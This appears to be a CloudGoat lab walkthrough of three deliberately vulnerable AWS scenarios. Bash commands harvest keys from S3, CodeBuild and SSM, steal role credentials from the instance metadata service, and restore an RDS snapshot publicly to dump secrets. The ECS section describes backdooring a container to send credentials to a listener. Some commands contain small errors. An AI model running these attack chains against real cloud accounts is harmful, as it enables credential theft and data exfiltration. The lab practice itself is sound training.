![012821-16-768x420](https://i.loli.net/2021/02/02/F8bSCgEjBV62ZI1.png)

![012821-17](https://i.loli.net/2021/02/02/Wuk4rNJjtwVLiHT.png)

![012821-18](https://i.loli.net/2021/02/02/7PmExID5pHhqiMe.png)

![012821-21](https://i.loli.net/2021/02/02/NwfnIF4igUPLs5j.png)

![012821-22](https://i.loli.net/2021/02/02/kEopOD1xcdgTahI.png)





#### McDuck’s path

```bash
# The attacker explores the AWS environment and discovers they are able to list S3 buckets using their starting keys.
# The attacker discovers several S3 buckets, but they are only able to access one of them. Inside that one S3 bucket they find a pair of SSH keys.
# The attacker lists EC2 instances and finds the EC2 instance behind the Load Balancer.
# The attacker discovers that the SSH keys found in the S3 bucket enable the attacker to log into the EC2 instance.
# Now working through the EC2 instance (and therefore operating with its role instead of McDuck's), the attacker is able to discover and access a private S3 bucket.
# Inside the private S3 bucket, the attacker finds a text file left behind by an irresponsible developer which contains the login credentials for an RDS database.
# The attacker is able to list and discover the RDS database referenced in the credentials file.
# The attacker is finally able to access the RDB database using the credentials they found in step 6 and acquire the scenario's goal: the secret text stored in the RDS database.

```



1. recon

```bash
#set command line parameters
INFILE=~/.aws/credentials


# ------------- 1. Deploying the resources gives us the access key and secret key
SRC_PROFILE='McDuck'
AWS_ACCESS_KEY_ID='xxx'
AWS_SECRET_ACCESS_KEY='yyy'
AWS_REGION='us-east-1'
USE_RNAME='McDuck'


# ------------- 2. create a profile
# aws configure --profile $SRC_PROFILE
echo "[$SRC_PROFILE]
REGION = $AWS_REGION
AWS_ACCESS_KEY_ID = $AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY = $AWS_SECRET_ACCESS_KEY
" | crudini --merge $INFILE
echo "Set creds for profile $PROFILE in $INFILE"



# ------------- 3. enumerating the policies and permissions
# lists S3 buckets, three S3 buckets,
aws s3 ls \
    --profile $SRC_PROFILE
# unauthorized to access two of the three buckets.
# have access to the keystore bucket, which contains SSH keys.
aws s3 ls s3://<bucket> \
    --recursive \
    --profile $SRC_PROFILE
# download the files
aws s3 cp s3://<bucket>/key.pub . \
    --profile $SRC_PROFILE



# ------------- 4. identify if there is a load balancer or EC2 instance deployed and if we have access to it.
# It’s the same EC2 instance and load balancer identified in Lara’s Path.
aws elbv2 describe-load-balancers --profile $SRC_PROFILE

# But this time we have an SSH key for the EC2 instance.
# So try connecting to the EC2 instance. But first, change the permission of the SSH key.
chmod 777 key.pub

ssh -i private_key ubuntu@public.ip.of.ec2



# ------------- 5. in the ec2
sudo apt-get install awscli

# access a private S3 bucket.
aws s3 ls
aws s3 ls s3://<bucket> --recursive

# have access to the last S3 bucket
# finds a “db.txt” contains the login credentials for an RDS database.
aws s3 cp s3://<bucket>/db.txt .
cat db.txt

# list and discover the RDS database
# need the address of the RDS instance.
aws rds describe-db-instances --region us-east-1


# access the RDS database using the credentials and acquires the scenario's goal: the secret text stored in the RDS database!
psql postgresql://<db_user>:<db_password>@<rds-instance>:5432/<db_name>
# cloudgoat ->
# cloudgoat ->\dt
# cloudgoat ->select * from sensitive_information;
```


![012821-36](https://i.loli.net/2021/02/02/v3LKVyuXNCgrile.png)



---


### Scenarios 7: codebuild_secrets (Large / Hard)


| ++             | ++                                       |
| -------------- | ---------------------------------------- |
| Scenario Goal  | get the SSH keys which grant direct access to the EC2  |
| Size           | Large                                    |
| Difficulty     | Hard                                     |
| Command        | `$ ./cloudgoat.py create codebuild_secrets` |


Starting as the IAM user Solo
- enumerates and explores CodeBuild projects,
- finding insecured IAM keys for the IAM user Calrissian therein.
- Then operating as Calrissian
- discovers an RDS database.
- Unable to access the database's contents directly,
- make clever use of the RDS snapshot functionality to acquire the scenario's goal: a pair of secret strings.


Alternatively
- explore SSM parameters and find SSH keys to an EC2 instance.
- Using the metadata service, acquire the EC2 instance-profile's keys and push deeper into the target environment
- eventually gaining access to the original database and the scenario goal inside (a pair of secret strings) by a more circuitous route.


#### Exploitation Route - 1


![scenario6-1-1](https://i.imgur.com/oT6f4RK.png)


```bash
## Setting up the scenario
python3 cloudgoat.py create codebuild_secrets
# have credentials of an IAM User "Solo" to being with.


#set command line parameters
INFILE=~/.aws/credentials


# ------------- 1. Deploying the resources gives us the access key and secret key
SRC_PROFILE='solo'
AWS_ACCESS_KEY_ID='xxx'
AWS_SECRET_ACCESS_KEY='yyy'
AWS_REGION='us-east-1'
# aws sts get-caller-identity --profile $SRC_PROFILE
USE_RNAME='solo'


# ------------- 2. create a profile
# aws configure --profile $SRC_PROFILE
echo "[$SRC_PROFILE]
REGION = $AWS_REGION
AWS_ACCESS_KEY_ID = $AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY = $AWS_SECRET_ACCESS_KEY
" | crudini --merge $INFILE
echo "Set creds for profile $SRC_PROFILE in $INFILE"



# ------------- 3. enumerating the policies and permissions
# use [enumerate-iam] script to see the user privileges
# IAM User "Solo" has some EC2, CodeBuild, RDS, S3 and SSM related permissions.

# enumeration using CodeBuild related permissions
# list all the CodeBuild projects that IAM user "Solo" has access to.
BUILDPROJECTINFO=`aws codebuild list-projects --profile $SRC_PROFILE`
# cg-codebuild-cgidxgz5plnjdu
# BUILDPROJECT=`echo $BUILDPROJECTINFO | jq -r .projects[]`

# retrieve more information related to this build project.
aws codebuild batch-get-projects \
    --names cg-codebuild-cgidxgz5plnjdu \
    --profile $SRC_PROFILE

aws codebuild batch-get-projects \
    --names cg-codebuild-cgidxgz5plnjdu \
    --query "projects[*].environment" \
    --profile $SRC_PROFILE
# notice that the environment variables of the build project have some IAM security credentials
# might possibly belong to an IAM User "Calrissian".



# ------------- 4. credentail for Calrissian
# To verify the credentials
# create an AWS CLI named profile with the security credentials
# run `aws sts get-caller-identity` for that profile.

# use [enumerate-iam] script to see the user privileges
# IAM User "Calrissian" has some EC2 and RDS related permissions.



# ------------- 5. check RDS instances in the AWS account.
aws rds describe-db-instances \
    --query "DBInstances[*].[DBInstanceIdentifier, Engine , DBName]" \
    --output text \
    --profile calrissian
# cg-rds-instance-cgidetofos97ig     postgres     securedb

# There is an RDS instance in the AWS account that is using "PostgreSQL" but it is not publicly accessible.
# This is our target RDS instance on which the secrets are stored in "securedb" database.

# There are various ways to continue our exploitation


# ------------- 6. create a snapshot of the running RDS instance
# use snapshot to create another RDS instance that we can control, from which we can extract the secrets.
# create a snapshot of the running RDS instance.
aws rds create-db-snapshot \
    --db-snapshot-identifier secrets-snapshot \
    --db-instance-identifier cg-rds-instance-<CLOUDGOAT-ID> \
    --profile calrissian

# create an RDS instance from the snapshot.
# For us to be able to access the RDS Instance we create publicly, place it in appropriate subnet and security group.

# 1. identify the subnet group of the already running RDS Instance.
aws rds describe-db-subnet-groups \
    --query "DBSubnetGroups[?contains(DBSubnetGroupName,'rds')]" \
    --profile calrissian

# 2. check if there is a security group that allows us to communicate with RDS service.
aws ec2 describe-security-groups \
    --query "SecurityGroups[?contains(Description,'RDS')]" \
    --profile calrissian

# create an RDS instance from the snapshot.
aws rds restore-db-instance-from-db-snapshot \
    --db-instance-identifier secrets-instance \
    --db-snapshot-identifier secrets-snapshot \
    --db-subnet-group-name <SUBNET_GROUP_NAME> \
    --publicly-accessible \
    --vpc-security-group-ids <SECURITY_GROUP_NAME> \
    --profile calrissian

# Now have an RDS instance that we control, reset the Master User Password for the database.
aws rds modify-db-instance \
    --db-instance-identifier secrets-instance \
    --master-user-password cloudgoat \
    --profile calrissian

# retrieve the information about the new RDS instance, connect to the database and extract secrets.
aws rds describe-db-instances \
    --query "DBInstances[*].[DBInstanceIdentifier,Engine,DBName,Endpoint,MasterUsername]" \
    --profile calrissian
# got the rds address


# to connect to the RDS instance
# can use any PostgreSQL client to connect to the database and extract the secrets,
# In this case, we are using `psql`, a command line PostgreSQL client -
sudo apt install postgresql-client
psql -h <INSTANCE-PUBLIC-DNS-NAME> -p 5432 -d securedb -U cgadmin

# connected to the database, use PostgreSQL commands to extract the secrets.
# securedb ->
# securedb -> \dt
# securedb -> select * from sensitive_information;
```

---

#### Exploitation Route - 2

![scenario6-2](https://i.imgur.com/XOa1z69.png)

> The above enumeration step was tricky and time consuming for me because the [enumerate-iam] script didn't check for `SSM:DescribeParameters` permission.
> AWS Systems Manager Parameter Store
> provides secure, hierarchical storage for configuration data management and secrets management.
> can store data such as passwords, database strings, EC2 instance IDs, EC2 SSH Key Pairs and license codes as parameter values.



```bash

# use the IAM User "Solo" credentials and exploit the AWS account in a different way.

# From the [enumerate-iam] script
# the user has `SSM:DescribeParameters` permission.
# allows to list the parameters stored in AWS Systems Manager Parameter Store.
# By design, most of the parameters stored tend to be of sensitive nature.

#  list all the parameters in the Parameter Store of the AWS account.
aws ssm describe-parameters --profile $SRC_PROFILE

# the Parameter Store has an EC2 SSH Key Pair.
# download the SSH private key
aws ssm get-parameter \
    --name cg-ec2-private-key-cgidetofos97ig \
    --query "Parameter.Value" \
    --output text \
    --profile $SRC_PROFILE | tee private-key

# check EC2 instances in the AWS account that we can use this SSH Key Pair against.
aws ec2 describe-instances \
    --query "Reservations[*].Instances[*].[KeyName,PublicIpAddress,Tags]" \
    --output text \
    --profile $SRC_PROFILE

# there is one EC2 instance that uses this SSH Key Pair. SSH into the EC2 instance -
chmod 400 private-key
ssh -i private-key ubuntu@<PUBLIC_IP_OF_EC2_INSTANCE>


# SSH into the SSH instance.
# two successful ways to find secret strings stored in a secure RDS database.


#### Route 2.1

# have the access to EC2 instance, use the IMDS service to do further enumeration.
# IMDS can be used to access user data that is specified when launching an EC2 instance. User Data tends to have sensitive information.
curl http://169.254.169.254/latest/user-data
# The User Data on the EC2 contains set of commands to connect to RDS instance from the EC2 instance.
# The command contains the credentials and endpoint for RDS Instance.
# The file also reveals the secret that is stored on the RDS instance.


#### Route 2.2

# It is a common practice to attach IAM roles to EC2 instances.
# Using this IAM roles the EC2 instance can interact with other AWS services in the AWS account.
# Any overly permissive IAM role can lead to privilege escalation.

# try and steal IAM Role credentials using IMDS.
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-<CLOUDGOAT_ID>

# The IAM role credentials we have stolen can be used like any other IAM identity credentials.
# the IAM role credentials are short lived and have a session token.
# The session token has to be manually added to the profile in the file `~/.aws/credentials` as `aws_session_token`.
aws configure --profile stolen-creds

# use [enumerate-iam](https://github.com/andresriancho/enumerate-iam) script
python enumerate-iam.py --access-key ACCESS-ID --secret-key SECRET-KEY --session-token SESSION-TOKEN
# Notice that the IAM role has some Lambda related permissions.

# list all the Lambda functions in the AWS account.
aws lambda list-functions --profile stolen-creds

# One of the Lambda functions has RDS instance database credentials in the environmant variables.

# Now that we have all the information required to connect to the target RDS instance
# use any PostgreSQL client to connect to the database and extract the secrets,
# In this case, using `psql`, a command line PostgreSQL client -

sudo apt install postgresql-client
psql -h <INSTANCE-PUBLIC-DNS-NAME> -p 5432 -d securedb -U cgadmin


# Once connected to the database, we can use commands to extract the secrets.
# securedb ->
# securedb -> \dt
# securedb -> select * from sensitive_information;


# Destroy the scenario resources
python3 cloudgoat.py destroy codebuild_secrets

```





---


### Scenarios 8: ecs_efs_attack (Large / Hard)



| ++             | ++                                       |
| -------------- | ---------------------------------------- |
| Scenario Goal  | get the SSH keys which grant direct access to the EC2  |
| Size           | Large                                    |
| Difficulty     | Hard                                     |
| Command        | `$ ./cloudgoat.py create ecs_efs_attack` |



Starting with access the "ruse" EC2
- the user leverages the instance profile to backdoor the running ECS container.
- Using the backdoored container the attacker can retrieve credentials from the container metadata API.
- These credentials allow to start a session on any EC2 with the proper tags set.
- The attacker uses their permissions to change the tags on the Admin EC2 and starts a session.
- Once in the Admin EC2, port scan the subnet for an open EFS to mount.
- Once mounted, retrieve the flag from the elastic file system.


![diagram](https://i.imgur.com/s63NaoU.png)

```bash


# Access the "Ruse_Box" ec2 using the provide access key.
ssh -i cloudgoat ubuntu@<IP ADDRESS>
# Configure the role credentials
aws configure --profile ruse
aws iam list --profile ruse

# From the ec2 enumate permission.

# list available ec2 and note how the tags are configured.
aws ec2 describe-instances --profile ruse

# enumate existing ecs cluster and backdoor the existing task defniniton.
aws ecs list-clusters --profile ruse
# List services in cloudgoat cluster
aws ecs list-services --cluster <CLUSTER ARN> --profile ruse
# Download task definition
aws ecs describe-task-definition \
    --task-definition <TASK_NAME>:<VERSION> \
    --profile ruse > task_def.json
# Download template to register a new task
aws ecs register-task-definition \
    --generate-cli-skeleton \
    --profile ruse > task_template.json


# Now use task_def.json to fill out template.json with the desired payload.

# register the template to replace the currently running task.
register-task-definition --cli-input-json file://task_template.json --profile ruse
# Wait for the task to run and POST the credentials to your listener

# With the new creds add them to "ruse_box"
aws configure --profile ecs

# Modify admin ec2 tags
aws ec2 create-tags \
    --resources <INSTANCE ID> \
    --tags Key=StartSession, Value=true

# Using ecs creds start a session on admin ec2
aws ssm start-session \
    --target <INSTANCE ID> \
    --profile ecs


# Update the existing service in the ecs cluster to execute the payload.


# From the container credentilas use the SSM:StartSession privlage to access the admin_box.


# Port scan the subnet to find available efs and mount.
# Looking at the ec2 instances we see the admin ec2 only has a single port open. We Nmap scan this port.
nmap -Pn -P 2049 --open 10.10.10.0/24


# Mount discovered ec2
cd /mnt
sudo mkdir /efs
sudo mount -t nfs4 -o nfsvers=4.1,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport <IP ADDRESS OF EFS>:/ efs

```
